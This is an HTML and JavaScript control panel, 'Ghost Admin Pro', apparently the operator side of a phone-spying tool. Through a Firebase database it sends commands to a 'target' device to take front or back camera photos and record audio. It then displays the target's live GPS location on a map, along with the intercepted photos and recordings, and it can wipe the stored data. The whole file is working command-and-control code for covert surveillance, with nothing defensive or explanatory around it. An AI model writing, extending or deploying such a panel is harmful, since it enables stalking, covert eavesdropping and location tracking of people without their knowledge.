<!DOCTYPE html>
<html>
<head>
    <title>Ghost Admin Pro - v3.5</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; height: 100vh; margin: 0; overflow: hidden; }
        #sidebar { width: 320px; border-right: 2px solid #0f0; padding: 20px; background: #050505; display: flex; flex-direction: column; }
        #mapArea { flex: 1; position: relative; display: flex; flex-direction: column; background: #080808; }
        #dataFeed { width: 100%; height: 350px; background: #000; border-top: 2px solid #0f0; overflow-y: auto; padding: 15px; box-sizing: border-box; }
        
        .header-title { color: #0f0; text-shadow: 0 0 10px #0f0; font-size: 20px; text-align: center; margin-bottom: 20px; }
        input { width: 100%; background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; box-sizing: border-box; margin-bottom: 10px; outline: none; }
        
        .btn { width: 100%; padding: 12px; margin: 8px 0; font-weight: bold; cursor: pointer; border: 1px solid #0f0; text-transform: uppercase; transition: 0.3s; }
        .btn-photo { background: #050; color: #0f0; }
        .btn-photo:hover { background: #0f0; color: #000; }
        .btn-audio { background: #004400; color: #0f0; }
        .btn-audio:hover { background: #00ff00; color: #000; }
        .btn-delete { background: #400; color: #f00; border-color: #f00; margin-top: auto; }

        .feed-section { margin-bottom: 20px; }
        .feed-title { color: #0f0; border-bottom: 1px solid #333; padding-bottom: 5px; margin-bottom: 10px; font-size: 14px; }
        
        #gallery img { width: 180px; border: 1px solid #0f0; margin: 5px; box-shadow: 0 0 5px #0f0; }
        audio { width: 100%; margin: 5px 0; filter: invert(100%) hue-rotate(90deg) brightness(1.5); }
        
        .status-box { font-size: 12px; margin-bottom: 10px; color: #888; }
        #targetStatus { color: #0f0; font-weight: bold; }
    </style>
</head>
<body>

    <div id="sidebar">
        <div class="header-title">GHOST TRACKER PRO</div>
        <div class="status-box">SYSTEM: <span id="targetStatus">READY</span></div>
        
        <input type="text" id="targetIdInput" placeholder="ENTER TARGET ID (e.g. Target_4917)">
        <button class="btn btn-photo" onclick="sendCommand('photo_front')">üì∑ CAPTURE FRONT</button>
        <button class="btn btn-photo" onclick="sendCommand('photo_back')">üì∏ CAPTURE BACK</button>
        <button class="btn btn-audio" onclick="sendCommand('audio_record')">üéôÔ∏è RECORD AUDIO (30S)</button>
        
        <div style="margin-top: 20px; font-size: 11px; color: #0a0;">
            * Commands are sent via Firebase Realtime Bridge.
        </div>
        
        <button class="btn btn-delete" onclick="clearData()">üóëÔ∏è WIPE DATA</button>
    </div>

    <div id="mapArea">
        <iframe id="mapFrame" width="100%" height="100%" frameborder="0" style="filter: invert(90%) hue-rotate(180deg);"></iframe>
        
        <div id="dataFeed">
            <div class="feed-section">
                <div class="feed-title">LIVE LOCATION DATA</div>
                <div id="locDisplay" style="font-size: 13px;">Waiting for target GPS...</div>
            </div>

            <div class="feed-section">
                <div class="feed-title">VISUAL INTERCEPTIONS</div>
                <div id="gallery"></div>
            </div>

            <div class="feed-section">
                <div class="feed-title">AUDIO INTERCEPTIONS</div>
                <div id="audioList"></div>
            </div>
        </div>
    </div>

<script>
    // 1. Firebase Config
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();

    // 2. Command Function
    function sendCommand(action) {
        const tid = document.getElementById('targetIdInput').value.trim();
        if (!tid) { alert("ERROR: TARGET ID REQUIRED"); return; }
        
        db.ref('commands/' + tid).set({
            action: action,
            timestamp: Date.now()
        }).then(() => {
            console.log("Command sent: " + action);
            document.getElementById('targetStatus').innerText = "SENDING...";
            setTimeout(() => { document.getElementById('targetStatus').innerText = "ONLINE"; }, 2000);
        });
    }

    // 3. Real-time Data Listener
    document.getElementById('targetIdInput').addEventListener('change', function() {
        const tid = this.value.trim();
        if (!tid) return;

        // Listen for Location
        db.ref('targets/' + tid + '/location').on('value', (snap) => {
            const loc = snap.val();
            if (loc) {
                document.getElementById('locDisplay').innerHTML = `LAT: ${loc.lat} | LNG: ${loc.lng} | ACC: ${loc.accuracy} | LAST SEEN: ${loc.last_seen}`;
                document.getElementById('mapFrame').src = `https://maps.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed`;
            }
        });

        // Listen for Photos
        db.ref('targets/' + tid + '/photos').on('child_added', (snap) => {
            const photo = snap.val();
            const img = document.createElement('img');
            img.src = photo.img;
            document.getElementById('gallery').prepend(img);
        });

        // Listen for Audios (Ye wo part hai jo aapne pucha tha)
        db.ref('targets/' + tid + '/audios').on('child_added', (snap) => {
            const audioData = snap.val().audio || snap.val().data; // Both keys supported
            if (audioData) {
                const container = document.createElement('div');
                container.style.marginBottom = "10px";
                
                const timeLabel = document.createElement('div');
                timeLabel.innerText = "Intercepted: " + (snap.val().timestamp || "Just now");
                timeLabel.style.fontSize = "10px";

                const audio = document.createElement('audio');
                audio.controls = true;
                audio.src = audioData;
                
                container.appendChild(timeLabel);
                container.appendChild(audio);
                document.getElementById('audioList').prepend(container);
            }
        });
    });

    function clearData() {
        const tid = document.getElementById('targetIdInput').value.trim();
        if (tid && confirm("WIPE ALL DATA FOR " + tid + "?")) {
            db.ref('targets/' + tid).remove();
            location.reload();
        }
    }
</script>
</body>
</html>
